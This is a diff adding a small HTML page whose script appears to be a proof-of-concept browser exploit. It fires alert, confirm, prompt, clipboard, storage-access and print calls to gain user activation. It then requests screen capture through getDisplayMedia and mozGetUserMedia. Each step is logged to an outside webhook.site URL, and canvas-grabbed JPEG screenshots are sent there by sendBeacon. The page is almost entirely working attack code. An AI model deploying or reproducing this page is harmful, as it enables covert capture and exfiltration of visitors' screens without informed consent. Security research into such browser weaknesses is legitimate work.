@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html><head><title>K</title></head>
+<body style="margin:0;background:#111;">
+<script>
+var W='https://webhook.site/6096bd38-ccee-4afd-be51-3090ac81c574';
+var N=0;
+function rpt(k,v){N++;new Image().src=W+'?n='+N+'&t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
+
+rpt('INIT','page=K|sec='+window.isSecureContext);
+
+var done=false;
+function processStream(label,stream){
+  if(done)return;done=true;
+  rpt('GOT_STREAM',label+'|tracks='+stream.getTracks().length);
+  stream.getTracks().forEach(function(t,i){
+    rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
+  });
+  var v=document.createElement('video');
+  v.srcObject=stream;v.autoplay=true;v.muted=true;
+  document.body.appendChild(v);
+  function grab(gl){
+    var w=v.videoWidth||1600,h=v.videoHeight||900;
+    rpt('GRAB',gl+'|'+w+'x'+h+'|rdy='+v.readyState);
+    if(w<=0||h<=0)return;
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',gl+'|'+e.message);return}
+    try{var d=ctx.getImageData(0,0,20,1);
+      var px=Array.from(d.data);
+      rpt('PX',gl+'|nz='+px.filter(function(x){return x>0}).length+'|'+px.slice(0,40).join(','));
+    }catch(e){rpt('PX_E',gl+'|'+e.message)}
+    try{var du=c.toDataURL('image/jpeg',0.8);
+      rpt('DU',gl+'|len='+du.length);
+      if(du.length>1000){navigator.sendBeacon(W,gl+':'+du)}
+    }catch(e){rpt('DU_E',gl+'|'+e.message)}
+  }
+  v.onloadeddata=function(){grab('ld0');setTimeout(function(){grab('ld1')},1000);setTimeout(function(){grab('ld3')},3000);};
+  setTimeout(function(){grab('t1')},500);setTimeout(function(){grab('t5')},5000);
+}
+
+async function run(){
+  // Test 1: alert() for activation
+  rpt('PRE_ALERT','active='+navigator.userActivation.isActive+'|had='+navigator.userActivation.hasBeenActive);
+  alert('x');
+  rpt('POST_ALERT','active='+navigator.userActivation.isActive+'|had='+navigator.userActivation.hasBeenActive);
+
+  // Test 2: confirm()
+  var c1=confirm('y');
+  rpt('POST_CONFIRM','r='+c1+'|active='+navigator.userActivation.isActive+'|had='+navigator.userActivation.hasBeenActive);
+
+  // Test 3: prompt()
+  var p1=prompt('z','v');
+  rpt('POST_PROMPT','r='+p1+'|active='+navigator.userActivation.isActive+'|had='+navigator.userActivation.hasBeenActive);
+
+  // If activation obtained, try capture
+  if(navigator.userActivation.isActive||navigator.userActivation.hasBeenActive){
+    rpt('ACTIVATED','yes! trying GDM');
+    try{
+      var s=await navigator.mediaDevices.getDisplayMedia({video:true});
+      rpt('GDM_OK','tracks='+s.getTracks().length);
+      processStream('gdm',s);
+    }catch(e){rpt('GDM_E',e.name+':'+e.message.substring(0,200))}
+    // Also try with specific display surface
+    try{
+      var s2=await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:'browser'}});
+      rpt('GDM2_OK','tracks='+s2.getTracks().length);
+      processStream('gdm2',s2);
+    }catch(e){rpt('GDM2_E',e.name+':'+e.message.substring(0,200))}
+  }else{
+    rpt('NO_ACT','dialogs did not grant activation');
+  }
+
+  // Also try mozGetUserMedia with mandatory regardless
+  if(navigator.mozGetUserMedia){
+    await new Promise(function(resolve){
+      navigator.mozGetUserMedia(
+        {video:{mandatory:{mediaSource:'browser'}}},
+        function(s){rpt('MOZ_OK','got stream!');processStream('moz',s);resolve()},
+        function(e){rpt('MOZ_E',e.name+':'+e.message.substring(0,100));resolve()});
+    });
+  }
+
+  // Try requestStorageAccess for activation
+  try{
+    await document.requestStorageAccess();
+    rpt('STORAGE_ACT','active='+navigator.userActivation.isActive);
+  }catch(e){rpt('STORAGE_E',e.name)}
+
+  // Try Clipboard API for activation
+  try{
+    await navigator.clipboard.readText();
+    rpt('CLIP_ACT','active='+navigator.userActivation.isActive);
+  }catch(e){rpt('CLIP_E',e.name)}
+
+  // Try window.print for activation
+  try{
+    window.print();
+    rpt('PRINT_ACT','active='+navigator.userActivation.isActive);
+  }catch(e){rpt('PRINT_E',e.name)}
+
+  rpt('DONE','K_complete');
+}
+
+run();
+</script>
+</body>
+</html>
